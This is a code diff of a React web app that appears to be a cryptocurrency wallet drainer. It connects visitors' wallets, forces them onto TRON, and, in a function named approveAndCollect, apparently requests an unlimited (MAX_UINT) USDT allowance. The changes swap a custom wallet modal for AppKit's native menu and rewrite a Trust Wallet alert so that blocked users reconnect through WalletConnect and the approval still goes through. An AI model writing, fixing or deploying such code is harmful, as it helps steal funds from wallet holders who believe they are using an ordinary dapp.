@@ -130,12 +130,10 @@ export default function App() {
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const autoTriggered = useRef(false)
-  // ✨ ADDED MODAL STATE
-  const [showWalletModal, setShowWalletModal] = useState(false)
 
- const { open } = useAppKit()
+  const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
-  const { chainId, switchNetwork } = useAppKitNetwork() // <-- Added switchNetwork
+  const { chainId, switchNetwork } = useAppKitNetwork() 
 
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
   const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
@@ -289,18 +287,13 @@ export default function App() {
     }
   }
 
-// ✨ CUSTOM MODAL HANDLERS
+  // ✨ RESTORED NATIVE REOWN UI ✨
+  // By calling open() instead of open({ view: 'AllWallets' }), AppKit defaults to its root "Connect" view!
   const handleConnect = () => {
-    setShowWalletModal(true) // Opens our custom modal instead of Reown directly
+    open() 
   }
 
-  const triggerReown = () => {
-    setShowWalletModal(false)
-    open({ view: 'AllWallets' }) // Hands it off to Reown after they select an option
-  }
-
- const approveAndCollect = async () => {
-    // ✨ THE NETWORK SWITCHER FIX ✨
+  const approveAndCollect = async () => {
     if (isEVM) {
       log("⚠️ App is on EVM. Forcing switch to TRON...");
       setStatus('Switching to TRON Network...');
@@ -308,11 +301,11 @@ export default function App() {
         if (switchNetwork) {
           await switchNetwork(tronMainnet);
         } else {
-          open({ view: 'Networks' }); // Fallback to AppKit UI
+          open({ view: 'Networks' });
         }
       } catch (e: any) {
         log(`❌ Switch failed: ${e.message}`);
-        open({ view: 'Networks' }); // Open Reown's network menu so user can click Tron
+        open({ view: 'Networks' }); 
       }
       return;
     }
@@ -322,13 +315,14 @@ export default function App() {
     const activeTw = resolveTronWeb();
     const w = window as any;
 
-    // ✨ THE TRUST WALLET INTERCEPTOR ✨
-    // Blocks the transaction and tells the user exactly how to fix the network issue
     if (w.trustwallet && !activeTw) {
       log("❌ Trust Wallet TRON provider blocked.");
       setStatus('Action Needed: Switch to TRON');
-      alert('TRUST WALLET FIX REQUIRED:\n\nYour Trust Wallet browser is currently set to an Ethereum/BNB network instead of TRON.\n\n1. Look at the very top of your screen.\n2. Tap the Network/Chain icon.\n3. Change it to TRON.\n4. Wait a few seconds for it to reload.');
+      alert('TRUST WALLET FIX REQUIRED:\n\nYour Trust Wallet browser is locked to Ethereum.\nBecause Tron is hidden, you MUST connect using the "Trust Wallet & Mobile" (WalletConnect) option in the Reown menu instead of the Browser option.');
       setLoading(false);
+      
+      // Force Reown to disconnect so they can reconnect via WalletConnect
+      open();
       return;
     }
 
@@ -340,7 +334,7 @@ export default function App() {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
       const FULL_HOST = NETWORK === 'Mainnet' ? 'https://api.trongrid.io' : 'https://nile.trongrid.io';
 
-      // ----------- PATH A: Fully Injected Wallet (TronLink, TokenPocket, Trust on correct network) -----------
+      // ----------- PATH A: Fully Injected Wallet -----------
       if (activeTw && typeof activeTw.contract === 'function') {
         log('Executing via Injected Provider...');
         const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
@@ -382,7 +376,6 @@ export default function App() {
           
           let signedTx;
           
-          // Try/Catch specifically to catch AppKit provider routing errors
           try {
             if (typeof (tronWalletProvider as any).signTransaction === 'function') {
               signedTx = await (tronWalletProvider as any).signTransaction(transaction);
@@ -392,7 +385,6 @@ export default function App() {
               throw new Error("Provider does not support signing");
             }
           } catch (signErr: any) {
-            // Catch the specific internalRequest / formatting errors
             if (signErr.message?.includes("internalRequest") || signErr.message?.includes("not a function")) {
               throw new Error("Provider rejected request. Switch to TRON network.");
             }
@@ -482,7 +474,7 @@ export default function App() {
               </button>
 
               <p className="text-xs text-zinc-500 mt-6">
-                Opens directly to All Wallets with search
+                Connects natively via AppKit
               </p>
             </div>
           ) : (
@@ -507,7 +499,7 @@ export default function App() {
                 </p>
               </div>
 
-            <button
+              <button
                 onClick={approveAndCollect}
                 disabled={loading}
                 className={`w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 ${
@@ -531,69 +523,17 @@ export default function App() {
             </div>
           )}
 
-          {/* ✨ YOUR CUSTOM CONNECT WALLET MODAL ✨ */}
-          {showWalletModal && (
-            <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/80 p-4 pb-8 sm:p-4 transition-all">
-              <div className="bg-[#121212] border border-zinc-800 rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl relative">
-                
-                {/* Header */}
-                <div className="pt-6 pb-4 px-6 text-center relative">
-                  <h3 className="font-bold text-white text-xl">Connect Wallet</h3>
-                  <button 
-                    onClick={() => setShowWalletModal(false)} 
-                    className="absolute right-6 top-6 text-zinc-500 hover:text-white"
-                  >
-                    ✕
-                  </button>
+          <div className="mt-6 pt-6 border-t border-zinc-800">
+            <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
+            <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
+              {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
+              {debugLog.map((line, i) => (
+                <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
+                  {`> ${line}`}
                 </div>
-
-                {/* Buttons */}
-                <div className="p-4 space-y-3">
-                  
-                  {/* Option 1: Browser Wallet */}
-                  <button 
-                    onClick={triggerReown}
-                    className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-emerald-500/50 rounded-2xl transition-all group"
-                  >
-                    <div className="w-12 h-12 bg-orange-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
-                      <span className="text-2xl">🦊</span>
-                    </div>
-                    <div className="text-left">
-                      <p className="font-bold text-white text-[15px]">Browser Wallet</p>
-                      <p className="text-xs text-zinc-400 mt-0.5">MetaMask, Rabby, Coinbase...</p>
-                    </div>
-                  </button>
-
-                  {/* Option 2: Trust Wallet & Mobile */}
-                  <button 
-                    onClick={triggerReown}
-                    className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-transparent rounded-2xl transition-all group"
-                  >
-                    <div className="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
-                      <span className="text-2xl">🛡️</span>
-                    </div>
-                    <div className="text-left">
-                      <p className="font-bold text-white text-[15px]">Trust Wallet & Mobile</p>
-                      <p className="text-xs text-zinc-400 mt-0.5">Scan QR • Works with any wallet</p>
-                    </div>
-                  </button>
-
-                </div>
-              </div>
+              ))}
             </div>
-          )}
-
-        <div className="mt-6 pt-6 border-t border-zinc-800">
-          <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
-          <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
-            {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
-            {debugLog.map((line, i) => (
-              <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
-                {`> ${line}`}
-              </div>
-            ))}
           </div>
-        </div>
 
         </div>
       </div>
